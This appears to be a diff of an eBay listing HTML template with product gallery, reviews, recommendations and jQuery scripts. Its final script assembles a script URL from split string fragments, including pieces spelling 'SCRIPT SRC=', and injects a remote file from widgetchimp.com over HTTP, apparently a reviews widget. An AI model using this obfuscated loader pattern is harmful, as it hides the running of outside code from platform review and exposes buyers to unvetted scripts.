+                            <a href="javascript:return false;">
+                                <img src="[@thumb_1@]" big="[@thumb_full_1@]" mid="[@thumb_full_1@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_2' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@thumb_2@]" big="[@thumb_full_2@]" mid="[@thumb_full_2@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_3' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@thumb_3@]" big="[@thumb_full_3@]" mid="[@thumb_full_3@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_4' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@thumb_4@]" big="[@thumb_full_4@]" mid="[@thumb_full_4@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_5' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@thumb_5@]" big="[@thumb_full_5@]" mid="[@thumb_full_5@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_6' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@thumb_6@]" big="[@thumb_full_6@]" mid="[@thumb_full_6@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_7' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@thumb_7@]" big="[@thumb_full_7@]" mid="[@thumb_full_7@]" />
+                            </a>
+                        </div>
+                    </li>
+                    [%END DATA%] [%DATA id:'thumb_8' if:'ne' value:''%]
+                    <li class="tb-selected">
+                        <div class="tb-pic tb-s40">
+                            <a href="javascript:return false;">
+                                <img src="[@thumb_8@]" big="[@thumb_full_8@]" mid="[@thumb_full_8@]" />
+                            </a>
+                        </div>
+                    </li>
                     [%END DATA%]
                 </ul>
             </div>
             <!--商品文字说明-->
             <div class="content">
                 <div class="content-item content-desc">
-                    [%data id:'description' if:'ne' value:'' %]
-                        [@description@]
-                    [%end data%]
-                 
-                    <div class="line"></div>
+                    [%data id:'description' if:'ne' value:'' %] [@description@] [%end data%]
                 </div>
+                <div class="line"></div>
                 <div class="content-item content-sp">
-                    <span class="title">SPECIFICATIONS</span>
-                       [@misc3@]
-                     <div class="line"></div>
+                    <span class="title">SPECIFICATIONS</span> [@misc3@]
                 </div>
-                <div class="content-item content-pack"> 
-                    <span class="title">PACKAGED CONTENT</span>
-                    [@misc4@]
-                    <div class="line"></div>
+                <div class="line"></div>
+                <div class="content-item content-pack">
+                    <span class="title">PACKAGED CONTENT</span> [@misc4@]
+                </div>
+                <div class="line"></div>
+            </div>
+            <!--视频-->
+            [%data id:'misc1' if:'ne' value:'' %]
+            <div class="video">
+                <object height="300" width="400"><param name="movie" value="http://www.youtube.com/v/[@misc1@]?version=3&hl=en_US" /><param name="allowFullScreen" value="true" /><param name="allowscriptaccess" value="always" /><embed allowfullscreen="true" allowscriptaccess="always" height="300" src="http://www.youtube.com/v/[@misc1@]?version=3&hl=en_US" type="application/x-shockwave-flash" width="400"></embed></object>
+            </div>
+            [%end data%]
+            <div class="clear"></div>
+        </div>
+    </div>
+    <!-- 留言 -->
+    <div class="message">
+        <div class="main">
+            <div class="line"></div>
+            <div class="title">LATEST PRODUCT REVIEWS</div>
+            <div class="red-line"></div>
+            <div class="line clear"></div>
+            <div class="introduce">
+                <ul class="img-box">
+                    <li>
+                        <a href="javascript:;">
+                            <img src="http://demo.thankbabe.com/ebay/v2/image/message_1.jpg" alt="">
+                        </a>
+                    </li>
+                    <li>
+                        <a href="javascript:;">
+                            <img src="http://demo.thankbabe.com/ebay/v2/image/message_2.jpg" alt="">
+                        </a>
+                    </li>
+                    <li>
+                        <a href="javascript:;">
+                            <img src="http://demo.thankbabe.com/ebay/v2/image/message_3.jpg" alt="">
+                        </a>
+                    </li>
+                    <li>
+                        <a href="javascript:;">
+                            <img src="http://demo.thankbabe.com/ebay/v2/image/message_4.jpg" alt="">
+                        </a>
+                    </li>
+                </ul>
+                <ul class="guide">
+                    <li>
+                        <a href="javascript:;">
+                            <img src="http://demo.thankbabe.com/ebay/v2/image/tell_friend.jpg" alt="">
+                        </a>
+                    </li>
+                    <li>
+                        <a href="javascript:;">
+                            <img src="http://demo.thankbabe.com/ebay/v2/image/watch_item.jpg" alt="">
+                        </a>
+                    </li>
+                </ul>
+            </div>
+            <div class="detail">
+                <div id="reviewswidget" class="message-content">
+                    <!--<div>
+                            <p class="product">NEW G&P 12V 160W Folding Solar Panel Portable Kit Campi</p>
+                            <p class="content">“Great seller Awesome to deal with 100% happy, ”</p>
+                            <p class="user-info">Buyer: g***0 (386) 09/05/2016</p>
+                        </div>
+                        <div class="line"></div>
+                        <div>
+                            <p class="product">NEW G&P 12V 160W Folding Solar Panel Portable Kit Campi</p>
+                            <p class="content">“Great seller Awesome to deal with 100% happy, ”</p>
+                            <p class="user-info">Buyer: g***0 (386) 09/05/2016</p>
+                        </div>
+                        <div class="line"></div>
+                        <div>
+                            <p class="product">NEW G&P 12V 160W Folding Solar Panel Portable Kit Campi</p>
+                            <p class="content">“Great seller Awesome to deal with 100% happy, ”</p>
+                            <p class="user-info">Buyer: g***0 (386) 09/05/2016</p>
+                        </div>
+                        <div class="line"></div>
+                        <div>
+                            <p class="product">NEW G&P 12V 160W Folding Solar Panel Portable Kit Campi</p>
+                            <p class="content">“Great seller Awesome to deal with 100% happy, ”</p>
+                            <p class="user-info">Buyer: g***0 (386) 09/05/2016</p>
+                        </div>-->
+                </div>
+                <div class="line"></div>
+                <div class="more clear">
+                    <a href="javascirpt:;">View All Rreviews</a>
                 </div>
             </div>
-            
-            <!--视频-->
-            <div class="video">
-                
+            <div class="clear" style=" margin-bottom:20px;">
             </div>
         </div>
     </div>
     <!--特性-->
+    <!--<div class="feature clear">
+            <div class="main">
+                <div class="line"></div>
+                <div class="title">
+                    <span>FEATURE</span>
+                </div>
+                <div class="red-line"></div>
+                <div class="line"></div>
+                <div class="item-box">
+                    <img src="http://demo.thankbabe.com/ebay/v2/image/feature.jpg" alt="">
+                    <div class="desc">
+                        atest FPV 5.8G version with headless
+                    </div>
+                </div>
+                <div class="item-box">
+                    <img src="http://demo.thankbabe.com/ebay/v2/image/feature.jpg" alt="">
+                    <div class="desc">
+                        atest FPV 5.8G version with headless
+                    </div>    
+                </div>
+                <div class="item-box">
+                    <img src="http://demo.thankbabe.com/ebay/v2/image/feature.jpg" alt="">
+                    <div class="desc">
+                        atest FPV 5.8G version with headless
+                    </div>    
+                </div>
+                <div class="item-box">
+                    <img src="http://demo.thankbabe.com/ebay/v2/image/feature.jpg" alt="">
+                    <div class="desc">
+                            atest FPV 5.8G version with headless
+                    </div>    
+                </div>
+            </div>
+        </div>-->
     [%if [@ebay_description@] ne '' %]
-    <div class="feature">
+    <div class="featur clear">
         <div class="main">
             <div class="line"></div>
             <div class="title">
-                FEATURE
+                <span>FEATURE</span>
             </div>
+            <div class="red-line"></div>
             <div class="line"></div>
             [@ebay_description@]
         </div>
-    </div>     
+    </div>
     [%/if%]
-               
     <!--推荐列表-->
     <div class="also_like">
-        <div class="main positoin-r">
-            <div class="title">WE ALSO RECOMMEND</div>
+        <div class="main">
+            <div class="title">
+                <span>YOU MIGHT ALSO LIKE</span>
+            </div>
+            <div class="line"></div>
             <div class="like_box">
-                <div  id="carousel-product2"  class="data" data-slick='{"slidesToShow": 4, "slidesToScroll": 4}'>
+                <div id="carousel-product2" class="data" data-slick='{"slidesToShow": 4, "slidesToScroll": 4}'>
                     [%EBAY_CROSSSELL SKU:"[@SKU@]" LIMIT:"20" %] [%PARAM *body%]
                     <div>
                         <div class="good_item">
                             <a href="[@ebay_upsell_url@]" title="[@ebay_title@]"><img src="[@upsell_thumb@]" alt="[@ebay_upsell_title@]"></a>
                             <div class="info">
                                 <span class="desc"> 
-                                    <a href="[@ebay_upsell_url@]">[%format type:'text' maxlength:'50' rmhtml:'1'%][@ebay_upsell_title@][%END FORMAT%]</a>
-                                </span>
+                                        <a href="[@ebay_upsell_url@]">[%format type:'text' maxlength:'50' rmhtml:'1'%][@ebay_upsell_title@][%END FORMAT%]</a>
+                                    </span>
                                 <span class="price">$[@upsell_current_price@]</span>
                             </div>
                         </div>
@@ -1282,7 +1867,7 @@ input::-webkit-input-placeholder{text-align: center;} */
             </div>
         </div>
     </div>
-    
+
     <!--底部-->
     <div class="footer">
         <div class="main">
@@ -1305,33 +1890,28 @@ input::-webkit-input-placeholder{text-align: center;} */
                         <span class="arrows"></span>
                     </li>
                     <li class="nav-item" content="nav-content-5">
-                        ConTast Us
+                        ConTastUs
                         <span class="arrows"></span>
                     </li>
                 </ul>
                 <div class="nav-content">
-                    <div class="content-item  nav-content-1">
-                        <a href="https://www.google.com.au/maps/place/110%2F114+Asquith+St,+Silverwater+NSW+2128/@-33.835641,151.034651,18z/data=!3m1!4b1!4m2!3m1!1s0x6b12a34fe84133eb:0xfd524d790d00cc6d" target="_blank">
-                            <img class="about-img-1" src="http://demo.thankbabe.com/ebay/v1/image/map.jpg" alt=""/>
-                        </a>
-                        <a href="javascript:;">
-                            <img class="about-img-2" src="http://demo.thankbabe.com/ebay/v1/image/tool.jpg" alt=""/>
-                        </a>
-                         <a href="javascript:;">
-                             <img src="http://demo.thankbabe.com/ebay/v1/image/support.jpg" alt=""/>    
-                        </a>
-                        <div class="about-desc">Welcome to OUR Ebay store, A 100% Australian owned importing company based in Sydney. Superandcheaper PTY LTD launched its first ebay store in 2005 . We have over 3000+ products from RCs to home Gym equipment, Power Garden tools and outdoor Gears.</div>
+                    <div class="content-item  nav-content-1" style="display: block;">
+                        [%content_zone id:"ebay_about_us"%][%end content_zone%]
                     </div>
-                    <div class="content-item  nav-content-2">2</div>
-                    <div class="content-item  nav-content-3">3</div>
-                    <div class="content-item  nav-content-4">4</div>
-                    <div class="content-item  nav-content-5">5</div>
+                    <div class="content-item  nav-content-2">
+                        [%content_zone id:"ebay_shipping"%][%end content_zone%]
+                    </div>
+                    <div class="content-item  nav-content-3">
+                        [%content_zone id:"ebay-payment-new"%][%end content_zone%]
+                    </div>
+                    <div class="content-item  nav-content-4">
+                        [%content_zone id:"ebay_warranty"%][%end content_zone%]
+                    </div>
+                    <div class="content-item  nav-content-5">
+                        [%content_zone id:"ebay-contact-us"%][%end content_zone%]
+                    </div>
                 </div>
-                <div class="figure">
-                    <img class="figure-img1" src="http://demo.thankbabe.com/ebay/v1/image/low-pirce.jpg" alt="">
-                    <img class="figure-img2"  src="http://demo.thankbabe.com/ebay/v1/image/quality.jpg" alt="">
-                    <img class="figure-img3" src="http://demo.thankbabe.com/ebay/v1/image/best-service.jpg" alt="">
-                </div>
+
             </div>
         </div>
     </div>
@@ -1348,7 +1928,7 @@ input::-webkit-input-placeholder{text-align: center;} */
     </div>
     <script type="text/javascript" src="https://www.superandcheaper.com.au/assets/themes/ebay/js/jquery.min.js"></script>
     <script type="text/javascript">
-(function(factory) {
+        (function(factory) {
     'use strict';
     if (typeof define === 'function' && define.amd) {
         define(['jquery'], factory);
@@ -3696,10 +4276,9 @@ input::-webkit-input-placeholder{text-align: center;} */
     };
 
 }));
-
     </script>
     <script type="text/javascript">
-    (function($){
+        (function($){
 
 	$.fn.imagezoom = function(options){
 
@@ -3902,78 +4481,97 @@ function MouseEvent(e) {
     top_ts.doSwitch();
     </script>
     <script type="text/javascript">
-    //轮播
-    $('.data').slick({
-        dots: false,
-        infinite: true,
-        speed: 500,
-        slidesToShow: 4,
-        slidesToScroll: 4
-    });
-    // 图片放大
-    $(document).ready(function(){
-        $(".jqzoom").imagezoom({
-            xzoom: 500,
-            yzoom: 500
-        });
-        $("#thumblist li a").click(function(){
-            $(this).parents("li").addClass("tb-selected").siblings().removeClass("tb-selected");
-            $(".jqzoom").attr('src',$(this).find("img").attr("mid"));
-            $(".jqzoom").attr('rel',$(this).find("img").attr("big"));
-        }).eq(0).click();
-    });
-
-    //去除价格重复
-    (function(){
-        function removeSameProduct(lis){
-            var items=$(lis);
-            if(!items)return;
-            items.each(function(index){
-                var itemJq=items.eq(index);
-                var alt=itemJq.find("img").attr("alt");
-                var imgItems=items.find('img[alt="'+alt+'"]');
-                if(imgItems.length>1){
-                    var liImtes=imgItems.parents("li");
-                    var maxPrice=0;
-                    var maxItemLi=null;
-                    liImtes.each(function(i){
-                        var itemLi=liImtes.eq(i);
-                        var priceStr= liImtes.eq(i).find(".price").html();
-                        var price=parseFloat(priceStr.trim().substring(1));
-                        if(maxPrice<=0 || price>maxPrice){
-                            maxPrice=price;
-                            if(maxItemLi)maxItemLi.remove();
-                            maxItemLi=itemLi;
-                            return;
-                        }else{
-                            itemLi.remove()
+        //轮播
+            $('.data').slick({
+                dots: false,
+                infinite: true,
+                speed: 500,
+                slidesToShow: 4,
+                slidesToScroll: 4
+            });
+            // 图片放大
+            $(document).ready(function(){
+                    $(".jqzoom").imagezoom({
+                        xzoom: 500,
+                        yzoom: 500
+                    });
+                    $("#thumblist li a").click(function(){
+                        $(this).parents("li").addClass("tb-selected").siblings().removeClass("tb-selected");
+                        $(".jqzoom").attr('src',$(this).find("img").attr("mid"));
+                        $(".jqzoom").attr('rel',$(this).find("img").attr("big"));
+                    }).eq(0).click();
+            });
+        
+            $(".lv1-box li").mouseenter(function(){
+                var item=$(this);
+                item.children(".dropdown-menu").show();
+            }).mouseleave(function(){
+                var item=$(this);
+                item.children(".dropdown-menu").hide();
+            });  
+        
+            //去除价格重复
+            (function(){
+                function removeSameProduct(lis){
+                    var items=$(lis);
+                    if(!items)return;
+                    items.each(function(index){
+                        var itemJq=items.eq(index);
+                        var alt=itemJq.find("img").attr("alt");
+                        var imgItems=items.find('img[alt="'+alt+'"]');
+                        if(imgItems.length>1){
+                            var liImtes=imgItems.parents("li");
+                            var maxPrice=0;
+                            var maxItemLi=null;
+                            liImtes.each(function(i){
+                                var itemLi=liImtes.eq(i);
+                                var priceStr= liImtes.eq(i).find(".price").html();
+                                var price=parseFloat(priceStr.trim().substring(1));
+                                if(maxPrice<=0 || price>maxPrice){
+                                    maxPrice=price;
+                                    if(maxItemLi)maxItemLi.remove();
+                                    maxItemLi=itemLi;
+                                    return;
+                                }else{
+                                    itemLi.remove()
+                                }
+                            });
                         }
                     });
                 }
-            });
-        }
 
-        function removeItem(productBox){
-            var products=$(productBox).find(".good_item");
-            if(!products || products.length<=0){
-                var contentJq=$(productBox).parents(".also_like");
-                contentJq.remove();
-            }
-        }
-        removeItem("#carousel-product");
-        removeItem("#carousel-product2");
-        removeSameProduct("#carousel-product li");
-        removeSameProduct("#carousel-product2 li");
-    })();     
-    //导航
-    $(".lv1-box li").mouseenter(function(){
-        var item=$(this);
-        item.children(".dropdown-menu").show();
-    }).mouseleave(function(){
-        var item=$(this);
-        item.children(".dropdown-menu").hide();
-    });  
-</script>
+                function removeItem(productBox){
+                    var products=$(productBox).find(".good_item");
+                    if(!products || products.length<=0){
+                        var contentJq=$(productBox).parents(".also_like");
+                        contentJq.remove();
+                    }
+                }
+                removeItem("#carousel-product");
+                removeItem("#carousel-product2");
+                removeSameProduct("#carousel-product li");
+                removeSameProduct("#carousel-product2 li");
+            })();     
+            //导航
+            $(".lv1-box li").mouseenter(function(){
+                var item=$(this);
+                item.children(".dropdown-menu").show();
+            }).mouseleave(function(){
+                var item=$(this);
+                item.children(".dropdown-menu").hide();
+            }); 
+            //移除导航
+            $('.nav_body_1 .detail-box[item-name="Toys"]').remove();
+            $('.nav_body_1 .detail-box[item-name="Sport outdoor"]').remove();
+            $('.nav_body_1 .detail-box[item-name="Home garden"]').remove();
+            // $('.nav_body_2 .home-garden-1').html($('.nav_body_1 .detail-box[item-name="Home garden"]'));
+            // $('.nav_body_3 .sports-outdoors-1').html($('.nav_body_1 .detail-box[item-name="Sport outdoor"]'));
+            $('.nav_body_1 .detail-box[item-name="Other"]').remove();
+    </script>
+
+    <script async type="text/javascript">
+        if(typeof ebayItemID=="undefined"){if(location.href.indexOf('.ebaydesc.')!=-1){ebayItemID=(location.href.match(/&item=([0-9]+)&/)[1]);}else{ebayItemID=(location.href.match(/\b\d{9,17}\b/));}};var resource = document.createElement("script");var hz = ".com";var fz0 = "netdna-cdn.widgetchimp"+hz+"/reviews/";var az = "SC";var bz = "RI";var cz = "PT";var dz = "SR";var ez = "C=";var fz = "htt";var gz = "p://";resource.src = fz+gz+fz0+ "superhobbystore-"+ebayItemID+"-15-2213.js";var script = document.getElementsByTagName("script")[0];script.parentNode.insertBefore(resource, script);
+    </script>
 </body>
 
 </html>
